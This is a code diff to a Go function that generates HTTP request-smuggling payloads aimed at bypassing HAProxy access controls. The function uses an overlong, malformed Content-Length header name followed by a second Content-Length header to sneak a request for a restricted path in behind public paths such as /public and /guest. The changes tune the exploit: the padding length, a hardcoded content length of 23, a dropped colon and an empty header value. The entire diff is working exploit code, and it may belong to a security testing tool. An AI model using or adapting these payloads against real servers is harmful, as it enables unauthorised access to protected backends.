@@ -40,10 +40,15 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 	}
 
 	// We'll test various public endpoints before the restricted one
+	// publicPaths := []string{
+	// 	"/",
+	// 	"/robots.txt",
+	// 	"/index",
+	// 	"/guest",
+	// }
+
 	publicPaths := []string{
-		"/",
-		"/robots.txt",
-		"/index",
+		"/public",
 		"/guest",
 	}
 
@@ -51,7 +56,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 	// 217 'a' characters is what's used in the public exploits
 	// User has indicated their specific PoC uses a header name (Content-Length0...:) that totals 271 chars,
 	// implying 255 'a's after "Content-Length0".
-	overflowPattern := "b" + strings.Repeat("a", 255)
+	overflowPattern := "0" + strings.Repeat("a", 256)
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
@@ -60,10 +65,11 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			path, publicPath, host)
 
 		// Properly calculate the content length dynamically for the *second* Content-Length header:
-		calculatedContentLengthForSecondHeader := len(smuggledRequest)
-
-		malformedHeaderName := "Content-Length" + overflowPattern + ":"
-
+		//calculatedContentLengthForSecondHeader := len(smuggledRequest)
+		calculatedContentLengthForSecondHeader := 23
+		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
+		malformedHeaderName := "Content-Length" + overflowPattern //+ ":"
+		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
 		// Create payload with dynamically calculated Content-Length
 		// CRITICAL: The order of headers MUST be preserved exactly as specified here
 		// for this exploit to work. The malformed header MUST be first, followed by
@@ -80,7 +86,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 				// 1. Malformed header MUST be first - this will be processed first by HAProxy
 				{
 					Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
-					Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
+					Value:  "",                  // Empty value, to be handled by BuildRawHTTPRequest
 				},
 				// 2. Regular Content-Length MUST be second - this will be processed by backend server
 				{
@@ -90,7 +96,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 				// 3. Connection header
 				{
 					Header: "Connection",
-					Value:  "keep-alive",
+					Value:  "close",
 				},
 			},
 		}
